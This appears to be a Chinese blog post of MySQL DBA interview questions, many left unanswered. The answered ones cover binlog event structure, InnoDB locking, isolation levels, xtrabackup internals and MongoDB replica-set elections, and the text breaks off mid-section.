    <content type="text"><![CDATA[好男人就是我, 我就是好男人！我就是王杰民 ^_^ 能说说你们这个业务的逻辑以及数据库怎么设计吗？答：在工作中遇到过的难点问题有哪些？能说说代表性几个吗？答：MySQL 异地冗灾怎么做？答：###业务数据增长量是多少G，数据库怎么监控数据增长量？ 答：分库分表逻辑简单说下？增量怎么解决？答：kafka会丢数据吗？为什么回丢数据？答：会丢数据MySQL 备份怎么做？ 备份校验怎么做？答：使用中间件之后的架构，数据库的事务是什么样子的？与程序直接链接数据库使用的事务区别是什么？答：之前分表了16张，在使用一定时间够发现16张表已经不满足了，那怎么扩容，扩容之后数据怎么同步过来？答：程序中的名词 线程和协程各是什么意思？答：有没有看过MySQL源码？那主从同步的底层是怎么实现的？底层的网络传输模式是什么样子的？答：innobackupex比冷拷贝的优势是什么？答：数据库的RC和RR事务级别区别是什么？答：MySQL 的 SQL审核怎么做？答：监控怎么做的？都监控哪些指标？答：系统怎么优化？答：MySQL GTID复制时候，发生问题，快速解决。为何不用找binlog file number和 binlogbposition点。就能直接change master to NewMaster ？答：工作中出现故障，你的判断处理思路是什么？答：服务器机器突然死机重启，怎么排查问题？答：统计一个log日志文件中，最后一个字段是手机号，取手机号的最后四位数字统计出现的次数，倒序现实打印出来。答：MySQL 半同步会丢数据吗？答：MySQL 主从原理，是主推送binlog还是从获取binlog？答：怎么做才能保证MySQL 不丢数据？答：MySQL IBP中的LRU的原理答：ph-ost 实现原理答：pt-osc和gh-ost 的区别答：MHA 架构中有没有做二次开发？MHA有什么缺点？在使用MHA架构，网络抖动了发生切换了怎么办？怎么防止这个问题发生？答：MySQL 清除三个小时的binlog？答：1mysql> PURGE MASTER LOGS BEFORE DATE_SUB(NOW(), INTERVAL 3 HOUR); MySQL binlog文件里面都有什么内容？答：binlog由一系列的binlog event构成。每个binlog event包含header和data两部分。 header部分提供的是event的公共的类型信息，包括event的创建时间，服务器等等。 data部分提供的是针对该event的具体信息，如具体数据的修改 从mysql5.0版本开始，binlog采用的是v4版本，第一个event都是format_desc event 用于描述binlog文件的格式版本，这个格式就是event写入binlog文件的格式。关于之前版本的binlog格式，可以参见binary-log-versions接下来的event就是按照上面的格式版本写入的event最后一个rotate event用于说明下一个binlog文件。binlog索引文件是一个文本文件，其中内容为当前的binlog文件列表。比如下面就是一个mysql-bin.index文件的内容。接下来分析下几种常见的event，其他的event类型可以参见官方文档。 format_desc event 下面是我在FLUSH LOGS之后新建的一个全新的binlog文件mysql-bin.000053，从binlog第一个event也就是format_desc event开始分析 前面4个字节是固定的magic number,值为0x6e6962fe。接着是一个format_desc event，先看下19个字节的header。这19个字节中前4个字节0x567fb2b8是时间戳，第5个字节0x0f是event type，接着4个字节0x00000004是server_id，再接着4个字节0x00000067是长度103，然后的4个字节0x0000006b是下一个event的起始位置107，接着的2个字节的0x0001是flag（1为LOG_EVENT_BINLOG_IN_USE_F，标识binlog还没有关闭，binlog关闭后，flag会被设置为0），这样4+1+4+4+4+2=19个字节的公共头就完了(extra_headers暂时没有用到)。然后是这个event的data部分，event的data分为Fixed data和Variable data两部分，其中Fixed data是event的固定长度和格式的数据，Variable data则是长度变化的数据，比如format_desc event的Fixed data长度是0x54=84个字节。下面看下这84=2+50+4+1+27个字节的分配：开始的2个字节0x0004为binlog的版本号4，接着的50个字节为mysql-server版本，如我的版本是5.5.46-0ubuntu0.14.04.2-log，与SELECT version();查看的结果一致。接下来4个字节是binlog创建时间，这里是0；然后的1个字节0x13是指之后所有event的公共头长度，这里都是19；接着的27个字节中每个字节为mysql已知的event（共27个）的Fixed data的长度；可以发现format_desc event自身的Variable data部分为空。 rotate event 接着我们不做额外操作，直接FLUSH LOGS，可以看到一个rotate event，除了format_desc event的flag从0x0001变成了0x0000。然后从0x567fb3c2开始是一个rotate event。依照前面的分析，前面19个字节为event的header，其event type是0x04，长度为0x2b=43，下一个event起始位置为0x96=150，然后是flag为0x0000，接着是event data部分，首先的8个字节为Fixed data部分，记录的是下一个binlog的位置偏移4，而余下来的43-19-8=16个字节为Variable data部分，记录的是下一个binlog的文件名mysql-bin.000054。对照mysqlbinlog -vv mysql-bin.000053可以验证。 query event 刷新binlog，设置binlog_format=statement，创建一个表CREATE TABLEtt(ivarchar(100) DEFAULT NULL) ENGINE=InnoDB, 然后在测试表tt中插入一条数据insert into tt values(‘abc’)，会产生3个event，包括2个query event和1个xid event。其中2个query event分别是BEGIN以及INSERT 语句，而xid event则是事务提交语句（xid event是支持XA的存储引擎才有的，因为测试表tt是innodb引擎的，所以会有。如果是myisam引擎的表，也会有BEGIN和COMMIT,只不过COMMIT会是一个query event而不是xid event）。 抛开format_desc event，从0000006b开始分析第一个query event。头部跟之前的event一样，只是query event的type为0x02，长度为0x44=64，下一个event位置为0xaf=175。flag为8，接着是data部分，从format_desc event我们可以知道query event的Fixed data部分为13个字节，因此也可以算出Variable data部分为64-19-13=32字节。 Fixed data：首先的4个字节0x00000026为执行该语句的thread id，接下来的4个字节是执行的时间0(以秒为单位)，接下来的1个字节0x04是语句执行时的默认数据库名字的长度，我这里数据库是test，所以长度为4.接着的2个字节0x0000是错误码（注：通常情况下错误码是0表示没有错误，但是在一些非事务性表如myisam表执行INSERT…SELECT语句时可能插入部分数据后遇到duplicate-key错误会产生错误码1062，或者是事务性表在INSERT…SELECT出错不会插入部分数据，但是在执行过程中CTRL+C终止语句也可能记录错误码。slave db在复制时会执行后检查错误码是否一致，如果不一致，则复制过程会中止）,接着2个字节0x001a为状态变量块的长度26。 Variable data：从0x001a之后的26个字节为状态变量块（这个暂时先不管），然后是默认数据库名test，以0x00结尾，然后是sql语句BEGIN，接下来就是第2个query event的内容了。 第二个query event与第一个格式一样，只是执行语句变成了insert into tt values(‘abc’)。 第三个xid event为COMMIT语句。前19个字节是通用头部，type是16。data部分中Fixed data为空，而variable data为8个字节，这8个字节0x000000008a是事务编号（注意事务编号不一定是小端字节序，因为是从内存中拷贝到磁盘的，所以这个字节序跟机器相关）。 0x0000006b-0x000000ae为query event，语句是BEGIN,前面已经分析过。 table_map event 0x0000000af开始为table_map event。除去头部19个字节，Fixed data为8个字节，前面6个字节0x32=50为table id，接着2个字节0x0001为flags。 Variable data部分，首先1个字节0x04为数据库名test的长度，然后5个字节是数据库名test+结束符。接着1个字节0x04为表名长度，接着5个字节为表名trow+结束符。接着1个字节0x02为列的数目。而后是2个列的类型定义，分别是0x03和0x0f（列的类型MYSQL_TYPE_LONG为0x03，MYSQL_TYPE_VARCHAR为0x0f)。接着是列的元数据定义，首先0x02表示元数据长度为2，因为MYSQL_TYPE_LONG没有元数据，而MYSQL_TYPE_VARCHAR元数据长度为2。接着的0x000a就是MYSQL_TYPE_VARCHAR的元数据，表示我们在定义表时的varchar字段c长度为10，最后一个字节0x02为掩码，表示第一个字段i不能为NULL。关于列的类型以及元数据等更详细的信息可以参见官方资料 write_rows event 从0x000000dd开始为write_rows event，除去头部19个字节，前6个字节0x32也是table id，然后两个字节0x0001为flags。接着的1个字节0x02为表中列的数目。然后1个字节0xff各个bit标识各列是否存在值，这里表示都存在。 接着的就是插入的各行数据了。第1个字节0xfe的各个bit标识该行变化之后各列是否为NULL，为NULL记为1.这里表示第1列不为NULL，因为第一行数据插入的是(1,NULL)。接下来是各列的数据，第一列是MYSQL_TYPE_LONG,长度为4个字节，所以0x00000001就是这个值。第二列是NULL不占字节。接下来是第二行，先是0xfc标识两列都不为NULL，先读取第一列的4个字节0x00000002也就是我们插入的数字2，然后读取第二列，先是一个字节的长度0x01，然后是内容0x61也就是字符’a’。到此，write_rows event也就分析完了。rows相关的event还有update_rows event和delete_rows event等，欲了解更多可以参见官方文档。 intvar event intvar event在binlog_format=statement时使用到，用于自增键类型auto_increment，十分重要。intval event的Fixed data部分为空，而Variable data部分为9个字节，第1个字节用于标识自增事件类型 LAST_INSERT_ID_EVENT = 1 or INSERT_ID_EVENT = 2，余下的8个字节为自增ID。 创建一个测试表 create table tinc (i int auto_increment primary key, c varchar(10)) engine=innodb;，然后执行一个插入语句INSERT INTO tinc(c) values(‘abc’);就可以看到intvar event了，这里的自增事件类型为INSERT_ID_EVENT。而如果用语句INSERT INTO tinc(i, c) VALUES(LAST_INSERT_ID()+1, ‘abc’)，则可以看到自增事件类型为LAST_INSERT_ID_EVENT的intvar event。 参考资料为官方资料 数据库加锁是什么样的流程？答：表级锁定（table-level）* 表级别的锁定是MySQL各存储引擎中最大颗粒度的锁定机制。该锁定机制最大的特点是实现逻辑非常简单，带来的系统负面影响最小。所以获取锁和释放锁的速度很快。由于表级锁一次会将整个表锁定，所以可以很好的避免困扰我们的死锁问题。当然，锁定颗粒度大所带来最大的负面影响就是出现锁定资源争用的概率也会最高，致使并大度大打折扣。使用表级锁定的主要是MyISAM，MEMORY，CSV等一些非事务性存储引擎。 行级锁定（row-level）* 行级锁定最大的特点就是锁定对象的颗粒度很小，也是目前各大数据库管理软件所实现的锁定颗粒度最小的。由于锁定颗粒度很小，所以发生锁定资源争用的概率也最小，能够给予应用程序尽可能大的并发处理能力而提高一些需要高并发应用系统的整体性能。虽然能够在并发处理能力上面有较大的优势，但是行级锁定也因此带来了不少弊端。由于锁定资源的颗粒度很小，所以每次获取锁和释放锁需要做的事情也更多，带来的消耗自然也就更大了。此外，行级锁定也最容易发生死锁。使用行级锁定的主要是InnoDB存储引擎。 页级锁定（page-level）* 页级锁定是MySQL中比较独特的一种锁定级别，在其他数据库管理软件中也并不是太常见。页级锁定的特点是锁定颗粒度介于行级锁定与表级锁之间，所以获取锁定所需要的资源开销，以及所能提供的并发处理能力也同样是介于上面二者之间。另外，页级锁定和行级锁定一样，会发生死锁。在数据库实现资源锁定的过程中，随着锁定资源颗粒度的减小，锁定相同数据量的数据所需要消耗的内存数量是越来越多的，实现算法也会越来越复杂。不过，随着锁定资源颗粒度的减小，应用程序的访问请求遇到锁等待的可能性也会随之降低，系统整体并发度也随之提升。使用页级锁定的主要是BerkeleyDB存储引擎。 总的来说，MySQL这3种锁的特性可大致归纳如下： 表级锁：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突的概率最高，并发度最低； 行级锁：开销大，加锁慢；会出现死锁；锁定粒度最小，发生锁冲突的概率最低，并发度也最高； 页面锁：开销和加锁时间界于表锁和行锁之间；会出现死锁；锁定粒度界于表锁和行锁之间，并发度一般。适用：从锁的角度来说，表级锁更适合于以查询为主，只有少量按索引条件更新数据的应用，如Web应用；而行级锁则更适合于有大量按索引条件并发更新少量不同数据，同时又有并发查询的应用，如一些在线事务处理（OLTP）系统。InnoDB锁定模式及实现机制InnoDB的行级锁定同样分为两种类型，共享锁和排他锁，而在锁定机制的实现过程中为了让行级锁定和表级锁定共存，InnoDB也同样使用了意向锁（表级锁定）的概念，也就有了意向共享锁和意向排他锁这两种。当一个事务需要给自己需要的某个资源加锁的时候，如果遇到一个共享锁正锁定着自己需要的资源的时候，自己可以再加一个共享锁，不过不能加排他锁。但是，如果遇到自己需要锁定的资源已经被一个排他锁占有之后，则只能等待该锁定释放资源之后自己才能获取锁定资源并添加自己的锁定。而意向锁的作用就是当一个事务在需要获取资源锁定的时候，如果遇到自己需要的资源已经被排他锁占用的时候，该事务可以需要锁定行的表上面添加一个合适的意向锁。如果自己需要一个共享锁，那么就在表上面添加一个意向共享锁。而如果自己需要的是某行（或者某些行）上面添加一个排他锁的话，则先在表上面添加一个意向排他锁。意向共享锁可以同时并存多个，但是意向排他锁同时只能有一个存在。所以，可以说InnoDB的锁定模式实际上可以分为四种：共享锁（S），排他锁（X），意向共享锁（IS）和意向排他锁（IX），我们可以通过以下表格来总结上面这四种所的共存逻辑关系： 如果一个事务请求的锁模式与当前的锁兼容，InnoDB就将请求的锁授予该事务；反之，如果两者不兼容，该事务就要等待锁释放。 意向锁是InnoDB自动加的，不需用户干预。对于UPDATE、DELETE和INSERT语句，InnoDB会自动给涉及数据集加排他锁（X)；对于普通SELECT语句，InnoDB不会加任何锁；事务可以通过以下语句显示给记录集加共享锁或排他锁。12共享锁（S）：SELECT * FROM table_name WHERE ... LOCK IN SHARE MODE排他锁（X)：SELECT * FROM table_name WHERE ... FOR UPDATE 用SELECT … IN SHARE MODE获得共享锁，主要用在需要数据依存关系时来确认某行记录是否存在，并确保没有人对这个记录进行UPDATE或者DELETE操作。 但是如果当前事务也需要对该记录进行更新操作，则很有可能造成死锁，对于锁定行记录后需要进行更新操作的应用，应该使用SELECT… FOR UPDATE方式获得排他锁。InnoDB行锁实现方式 InnoDB行锁是通过给索引上的索引项加锁来实现的，只有通过索引条件检索数据，InnoDB才使用行级锁，否则，InnoDB将使用表锁 在实际应用中，要特别注意InnoDB行锁的这一特性，不然的话，可能导致大量的锁冲突，从而影响并发性能。下面通过一些实际例子来加以说明。 （1）在不通过索引条件查询的时候，InnoDB确实使用的是表锁，而不是行锁。 （2）由于MySQL的行锁是针对索引加的锁，不是针对记录加的锁，所以虽然是访问不同行的记录，但是如果是使用相同的索引键，是会出现锁冲突的。 （3）当表有多个索引的时候，不同的事务可以使用不同的索引锁定不同的行，另外，不论是使用主键索引、唯一索引或普通索引，InnoDB都会使用行锁来对数据加锁。 （4）即便在条件中使用了索引字段，但是否使用索引来检索数据是由MySQL通过判断不同执行计划的代价来决定的，如果MySQL认为全表扫描效率更高，比如对一些很小的表，它就不会使用索引，这种情况下InnoDB将使用表锁，而不是行锁。因此，在分析锁冲突时，别忘了检查SQL的执行计划，以确认是否真正使用了索引。 3.间隙锁（Next-Key锁） 当我们用范围条件而不是相等条件检索数据，并请求共享或排他锁时，InnoDB会给符合条件的已有数据记录的索引项加锁； 对于键值在条件范围内但并不存在的记录，叫做“间隙（GAP)”，InnoDB也会对这个“间隙”加锁，这种锁机制就是所谓的间隙锁（Next-Key锁） nnoDB使用间隙锁的目的： 防止幻读，以满足相关隔离级别的要求。对于上面的例子，要是不使用间隙锁，如果其他事务插入了empid大于100的任何记录，那么本事务如果再次执行上述语句，就会发生幻读； 为了满足其恢复和复制的需要。 很显然，在使用范围条件检索并锁定记录时，即使某些不存在的键值也会被无辜的锁定，而造成在锁定的时候无法插入锁定键值范围内的任何数据。在某些场景下这可能会对性能造成很大的危害。 除了间隙锁给InnoDB带来性能的负面影响之外，通过索引实现锁定的方式还存在其他几个较大的性能隐患： 当Query无法利用索引的时候，InnoDB会放弃使用行级别锁定而改用表级别的锁定，造成并发性能的降低； 当Query使用的索引并不包含所有过滤条件的时候，数据检索使用到的索引键所只想的数据可能有部分并不属于该Query的结果集的行列，但是也会被锁定，因为间隙锁锁定的是一个范围，而不是具体的索引键； 当Query在使用索引定位数据的时候，如果使用的索引键一样但访问的数据行不同的时候（索引只是过滤条件的一部分），一样会被锁定。因此，在实际应用开发中，尤其是并发插入比较多的应用，我们要尽量优化业务逻辑，尽量使用相等条件来访问更新数据，避免使用范围条件。还要特别说明的是，InnoDB除了通过范围条件加锁时使用间隙锁外，如果使用相等条件请求给一个不存在的记录加锁，InnoDB也会使用间隙锁。通常来说，死锁都是应用设计的问题，通过调整业务流程、数据库对象设计、事务大小，以及访问数据库的SQL语句，绝大部分死锁都可以避免。下面就通过实例来介绍几种避免死锁的常用方法： 在应用中，如果不同的程序会并发存取多个表，应尽量约定以相同的顺序来访问表，这样可以大大降低产生死锁的机会。 在程序以批量方式处理数据的时候，如果事先对数据排序，保证每个线程按固定的顺序来处理记录，也可以大大降低出现死锁的可能。 在事务中，如果要更新记录，应该直接申请足够级别的锁，即排他锁，而不应先申请共享锁，更新时再申请排他锁，因为当用户申请排他锁时，其他事务可能又已经获得了相同记录的共享锁，从而造成锁冲突，甚至死锁。 在REPEATABLE-READ隔离级别下，如果两个线程同时对相同条件记录用SELECT…FOR UPDATE加排他锁，在没有符合该条件记录情况下，两个线程都会加锁成功。程序发现记录尚不存在，就试图插入一条新记录，如果两个线程都这么做，就会出现死锁。这种情况下，将隔离级别改成READ COMMITTED，就可避免问题。 当隔离级别为READ COMMITTED时，如果两个线程都先执行SELECT…FOR UPDATE，判断是否存在符合条件的记录，如果没有，就插入记录。此时，只有一个线程能插入成功，另一个线程会出现锁等待，当第1个线程提交后，第2个线程会因主键重出错，但虽然这个线程出错了，却会获得一个排他锁。这时如果有第3个线程又来申请排他锁，也会出现死锁。对于这种情况，可以直接做插入操作，然后再捕获主键重异常，或者在遇到主键重错误时，总是执行ROLLBACK释放获得的排他锁。 什么时候使用表锁对于InnoDB表，在绝大部分情况下都应该使用行级锁，因为事务和行锁往往是我们之所以选择InnoDB表的理由。但在个别特殊事务中，也可以考虑使用表级锁： * 事务需要更新大部分或全部数据，表又比较大，如果使用默认的行锁，不仅这个事务执行效率低，而且可能造成其他事务长时间锁等待和锁冲突，这种情况下可以考虑使用表锁来提高该事务的执行速度。 * 事务涉及多个表，比较复杂，很可能引起死锁，造成大量事务回滚。这种情况也可以考虑一次性锁定事务涉及的表，从而避免死锁、减少数据库因事务回滚带来的开销。 当然，应用中这两种事务不能太多，否则，就应该考虑使用MyISAM表了。 * 在InnoDB下，使用表锁要注意以下两点。 * 使用LOCK TABLES虽然可以给InnoDB加表级锁，但必须说明的是，表锁不是由InnoDB存储引擎层管理的，而是由其上一层──MySQL Server负责的，仅当autocommit=0、InnoDB_table_locks=1（默认设置）时，InnoDB层才能知道MySQL加的表锁，MySQL Server也才能感知InnoDB加的行锁，这种情况下，InnoDB才能自动识别涉及表级锁的死锁，否则，InnoDB将无法自动检测并处理这种死锁 * 在用 LOCK TABLES对InnoDB表加锁时要注意，要将AUTOCOMMIT设为0，否则MySQL不会给表加锁；事务结束前，不要用UNLOCK TABLES释放表锁，因为UNLOCK TABLES会隐含地提交事务；COMMIT或ROLLBACK并不能释放用LOCK TABLES加的表级锁，必须用UNLOCK TABLES释放表锁 SQL优化怎么做？SQL执行过程是什么样子的？从client发起请求到数据库执行SQL在返回数据流程是什么？答： 连接 客户端发起一条Query请求，监听客户端的’连接管理模块’接收请求 将请求转发到’连接进/线程模块’ 调用’用户模块’来进行授权检查 通过检查后，’连接进/线程模块’从’线程连接池’中取出空闲的被缓存的连接线程和客户端请求对接，如果失败则创建一个新的连接请求处理 先查询缓存，检查Query语句是否完全匹配，接着再检查是否具有权限，都成功则直接取数据返回 上一步有失败则转交给’命令解析器’，经过词法分析，语法分析后生成解析树 接下来是预处理阶段，处理解析器无法解决的语义，检查权限等，生成新的解析树 再转交给对应的模块处理 如果是SELECT查询还会经由’查询优化器’做大量的优化，生成执行计划 模块收到请求后，通过’访问控制模块’检查所连接的用户是否有访问目标表和目标字段的权限 有则调用’表管理模块’，先是查看table cache中是否存在，有则直接对应的表和获取锁，否则重新打开表文件 根据表的meta数据，获取表的存储引擎类型等信息，通过接口调用对应的存储引擎处理 上述过程中产生数据变化的时候，若打开日志功能，则会记录到相应二进制日志文件中结果 Query请求完成后，将结果集返回给’连接进/线程模块’ 返回的也可以是相应的状态标识，如成功或失败等 连接进/线程模块’进行后续的清理工作，并继续等待请求或断开与客户端的连接 小结用户模块校验用户,然后去线程连接池拿线程(连接足够的话),找命令分发器,到查询缓存模块查SQL语句,如果没有,走命令解析器,然后访问控制模块,设定用户的权限,设定好后走表管理模块,获取锁和缓存,然后获取各种信息,存储的方式:存储引擎,从存储引擎获取数据,然后返回 数据库事务ACID特性答：数据库事务ACID特性,数据库事务的4个特性： 原子性(Atomic): 事务中的多个操作，不可分割，要么都成功，要么都失败； All or Nothing. 一致性(Consistency): 事务操作之后, 数据库所处的状态和业务规则是一致的; 比如a,b账户相互转账之后，总金额不变； 隔离性(Isolation): 多个事务之间就像是串行执行一样，不相互影响; 持久性(Durability): 事务提交后被持久化到永久存储.隔离性,其中隔离性分为了四种： READ UNCOMMITTED：可以读取未提交的数据，未提交的数据称为脏数据，所以又称脏读。此时：幻读，不可重复读和脏读均允许； READ COMMITTED：只能读取已经提交的数据；此时：允许幻读和不可重复读，但不允许脏读，所以RC隔离级别要求解决脏读； REPEATABLE READ：同一个事务中多次执行同一个select,读取到的数据没有发生改变；此时：允许幻读，但不允许不可重复读和脏读，所以RR隔离级别要求解决不可重复读； SERIALIZABLE: 幻读，不可重复读和脏读都不允许，所以serializable要求解决幻读；加强理解： 脏读：可以读取未提交的数据。RC 要求解决脏读； 不可重复读：同一个事务中多次执行同一个select, 读取到的数据发生了改变(被其它事务update并且提交)； 可重复读：同一个事务中多次执行同一个select, 读取到的数据没有发生改变(一般使用MVCC实现)；RR各级级别要求达到可重复读的标准； 幻读：同一个事务中多次执行同一个select, 读取到的数据行发生改变。也就是行数减少或者增加了(被其它事务delete/insert并且提交)。SERIALIZABLE要求解决幻读问题； 这里一定要区分 不可重复读 和 幻读： 不可重复读的重点是修改: 同样的条件的select, 你读取过的数据, 再次读取出来发现值不一样了 幻读的重点在于新增或者删除: 同样的条件的select, 第1次和第2次读出来的记录数不一样 从结果上来看, 两者都是为多次读取的结果不一致。但如果你从实现的角度来看, 它们的区别就比较大： 对于前者, 在RC下只需要锁住满足条件的记录，就可以避免被其它事务修改，也就是 select for update, select in share mode; RR隔离下使用MVCC实现可重复读； 对于后者, 要锁住满足条件的记录及所有这些记录之间的gap，也就是需要 gap lock。 而ANSI SQL标准没有从隔离程度进行定义，而是定义了事务的隔离级别，同时定义了不同事务隔离级别解决的三大并发问题： Isolation Level Dirty Read Unrepeatable Read Phantom Read Read UNCOMMITTED YES YES YES READ COMMITTED NO YES YES READ REPEATABLE NO NO YES SERIALIZABLE NO NO NO MySQL 中RC和RR隔离级别的区别MySQL数据库中默认隔离级别为RR，但是实际情况是使用RC 和 RR隔离级别的都不少。好像淘宝、网易都是使用的 RC 隔离级别。那么在MySQL中 RC 和 RR有什么区别呢？我们该如何选择呢？为什么MySQL将RR作为默认的隔离级别呢？RC 与 RR 在锁方面的区别 显然 RR 支持 gap lock(next-key lock)，而RC则没有gap lock。因为MySQL的RR需要gap lock来解决幻读问题。而RC隔离级别则是允许存在不可重复读和幻读的。所以RC的并发一般要好于RR； RC 隔离级别，通过 where 条件过滤之后，不符合条件的记录上的行锁，会释放掉(虽然这里破坏了“两阶段加锁原则”)；但是RR隔离级别，即使不符合where条件的记录，也不会是否行锁和gap lock；所以从锁方面来看，RC的并发应该要好于RR；另外 insert into t select … from s where 语句在s表上的锁也是不一样的 两个并发事务A，B执行的时间序列如下(A先于B开始，B先于A结束)1234567A1: start transaction;B1: start transaction;A2: select * from t;B2: insert into t values (4, wangwu);A3: select * from t;B3: commit;A4: select * from t; 123456789101112提问1：假设事务的隔离级别是可重复读RR，事务A中的三次查询，A2, A3, A4分别读到什么结果集？回答：RR下(1)A2读到的结果集肯定是{1, 2, 3}，这是事务A的第一个read，假设为时间T；(2)A3读到的结果集也是{1, 2, 3}，因为B还没有提交；(3)A4读到的结果集还是{1, 2, 3}，因为事务B是在时间T之后提交的，A4得读到和A2一样的记录；提问2：假设事务的隔离级别是读提交RC，A2, A3, A4又分别读到什么结果集呢？回答：RC下(1)A2读到的结果集是{1, 2, 3}；(2)A3读到的结果集也是{1, 2, 3}，因为B还没有提交；(3)A4读到的结果集还是{1, 2, 3, 4}，因为事务B已经提交 仍然是上面的两个事务，只是A和B开始时间稍有不同(B先于A开始，B先于A结束)12345678910111213B1: start transaction;A1: start transaction;A2: select * from t;B2: insert into t values (4, wangwu);A3: select * from t;B3: commit;A4: select * from t;提问3：假设事务的隔离级别是可重复读RR，事务A中的三次查询，A2, A3, A4分别读到什么结果集？提问4：假设事务的隔离级别是读提交RC，A2, A3, A4的结果集又是什么呢？回答：事务的开始时间不一样，不会影响“快照读”的结果，所以结果集和case 1一样。 仍然是并发的事务A与B(A先于B开始，B先于A结束)12345678910A1: start transaction;B1: start transaction;B2: insert into t values (4, wangwu);B3: commit;A2: select * from t;提问5：假设事务的隔离级别是可重复读RR，事务A中的A2查询，结果集是什么？提问6：假设事务的隔离级别是读提交RC，A2的结果集又是什么呢？回答：在RR下，A2是事务A的第一个read，假设为时间T，它能读取到T之前提交事务写入的数据行，故结果集为{1, 2, 3, 4}。在RC下，没有疑问，一定是{1, 2, 3, 4}。 事务开始的时间再换一下(B先于A开始，B先于A结束)12345678910B1: start transaction;A1: start transaction;B2: insert into t values (4, wangwu);B3: commit;A2: select * from t;提问7：假设事务的隔离级别是可重复读RR，事务A中的A2查询，结果集是什么？提问8：假设事务的隔离级别是读提交RC，A2的结果集又是什么呢？回答：事务的开始时间不一样，不会影响“快照读”的结果，所以结果集和case 3一样。 总结： RR下，事务在第一个Read操作时，会建立Read View RC下，事务在每次Read操作时，都会建立Read View 怎么针对数据库中某一张表中的一条数据上锁？答：12mysql> SELECT * FROM T1 WHERE ID = 1 FOR UPDATE;mysql> SELECT * FROM T1 WHERE ID = 1 LOCK IN SHARE MODE; 行锁的三种模式，讲讲是什么？答：InnoDB有三种行锁的算法： Record Lock：单个行记录上的锁。 Gap Lock：间隙锁，锁定一个范围，但不包括记录本身。GAP锁的目的，是为了防止同一事务的两次当前读，出现幻读的情况。 Next-Key Lock：1+2，锁定一个范围，并且锁定记录本身。对于行的查询，都是采用该方法，主要目的是解决幻读的问题。 innobackupex原理说一下答： innobackupex 在启动后，会先 fork 一个进程，启动 xtrabackup进程，然后就等待 xtrabackup 备份完 ibd 数据文件； xtrabackup 在备份 InnoDB 相关数据时，是有2种线程的，1种是 redo 拷贝线程，负责拷贝 redo 文件，1种是 ibd 拷贝线程，负责拷贝 ibd 文件；redo 拷贝线程只有一个，在 ibd 拷贝线程之前启动，在 ibd 线程结束后结束。xtrabackup 进程开始执行后，先启动 redo 拷贝线程，从最新的 checkpoint 点开始顺序拷贝 redo 日志；然后再启动 ibd 数据拷贝线程，在 xtrabackup 拷贝 ibd 过程中，innobackupex 进程一直处于等待状态（等待文件被创建）。 xtrabackup 拷贝完成idb后，通知 innobackupex（通过创建文件），同时自己进入等待（redo 线程仍然继续拷贝）; innobackupex 收到 xtrabackup 通知后，执行FLUSH TABLES WITH READ LOCK (FTWRL)，取得一致性位点，然后开始备份非 InnoDB 文件（包括 frm、MYD、MYI、CSV、opt、par等）。拷贝非 InnoDB 文件过程中，因为数据库处于全局只读状态，如果在业务的主库备份的话，要特别小心，非 InnoDB 表（主要是MyISAM）比较多的话整库只读时间就会比较长，这个影响一定要评估到。 当 innobackupex 拷贝完所有非 InnoDB 表文件后，通知 xtrabackup（通过删文件） ，同时自己进入等待（等待另一个文件被创建）； xtrabackup 收到 innobackupex 备份完非 InnoDB 通知后，就停止 redo 拷贝线程，然后通知 innobackupexredo log 拷贝完成（通过创建文件）； innobackupex 收到 redo 备份完成通知后，就开始解锁，执行 UNLOCK TABLES； 最后 innobackupex 和 xtrabackup 进程各自完成收尾工作，如资源的释放、写备份元数据信息等，innobackupex 等待 xtrabackup 子进程结束后退出。 在上面描述的文件拷贝，都是备份进程直接通过操作系统读取数据文件的，只在执行 SQL 命令时和数据库有交互，基本不影响数据库的运行，在备份非 InnoDB 时会有一段时间只读（如果没有MyISAM表的话，只读时间在几秒左右），在备份 InnoDB 数据文件时，对数据库完全没有影响，是真正的热备。InnoDB 和非 InnoDB 文件的备份都是通过拷贝文件来做的，但是实现的方式不同，前者是以page为粒度做的(xtrabackup)，后者是 cp 或者 tar 命令(innobackupex)，xtrabackup 在读取每个page时会校验 checksum 值，保证数据块是一致的，而 innobackupex 在 cp MyISAM 文件时已经做了flush（FTWRL），磁盘上的文件也是完整的，所以最终备份集里的数据文件都是写入完整的。 对NoSQL有了解吗？mongoDB副本集选举流程什么？答：Mongodb复制集由一组Mongod实例（进程）组成，包含一个Primary节点和多个Secondary节点，Mongodb Driver（客户端）的所有数据都写入Primary，Secondary从Primary同步写入的数据，以保持复制集内所有成员存储相同的数据集，提供数据的高可用。 Primary选举 复制集通过replSetInitiate命令（或mongo shell的rs.initiate()）进行初始化，初始化后各个成员间开始发送心跳消息，并发起Priamry选举操作，获得『大多数』成员投票支持的节点，会成为Primary，其余节点成为Secondary。 大多数』的定义 假设复制集内投票成员（后续介绍）数量为N，则大多数为 N/2 + 1，当复制集内存活成员数量不足大多数时，整个复制集将无法选举出Primary，复制集将无法提供写服务，处于只读状态。 特殊的Secondary 正常情况下，复制集的Seconary会参与Primary选举（自身也可能会被选为Primary），并从Primary同步最新写入的数据，以保证与Primary存储相同的数据。 Secondary可以提供读服务，增加Secondary节点可以提供复制集的读服务能力，同时提升复制集的可用性。另外，Mongodb支持对复制集的Secondary节点进行灵活的配置，以适应多种场景的需求。 特殊的Secondary 正常情况下，复制集的Seconary会参与Primary选举（自身也可能会被选为Primary），并从Primary同步最新写入的数据，以保证与Primary存储相同的数据。 Secondary可以提供读服务，增加Secondary节点可以提供复制集的读服务能力，同时提升复制集的可用性。另外，Mongodb支持对复制集的Secondary节点进行灵活的配置，以适应多种场景的需求 Arbiter Arbiter节点只参与投票，不能被选为Primary，并且不从Primary同步数据。 比如你部署了一个2个节点的复制集，1个Primary，1个Secondary，任意节点宕机，复制集将不能提供服务了（无法选出Primary），这时可以给复制集添加一个Arbiter节点，即使有节点宕机，仍能选出Primary。 Arbiter本身不存储数据，是非常轻量级的服务，当复制集成员为偶数时，最好加入一个Arbiter节点，以提升复制集可用性。 Priority0 Priority0节点的选举优先级为0，不会被选举为Primary。 比如你跨机房A、B部署了一个复制集，并且想指定Primary必须在A机房，这时可以将B机房的复制集成员Priority设置为0，这样Primary就一定会是A机房的成员。（注意：如果这样部署，最好将『大多数』节点部署在A机房，否则网络分区时可能无法选出Primary） Vote0 Mongodb 3.0里，复制集成员最多50个，参与Primary选举投票的成员最多7个，其他成员（Vote0）的vote属性必须设置为0，即不参与投票。 Hidden Hidden节点不能被选为主（Priority为0），并且对Driver不可见。 因Hidden节点不会接受Driver的请求，可使用Hidden节点做一些数据备份、离线计算的任务，不会影响复制集的服务。 Delayed 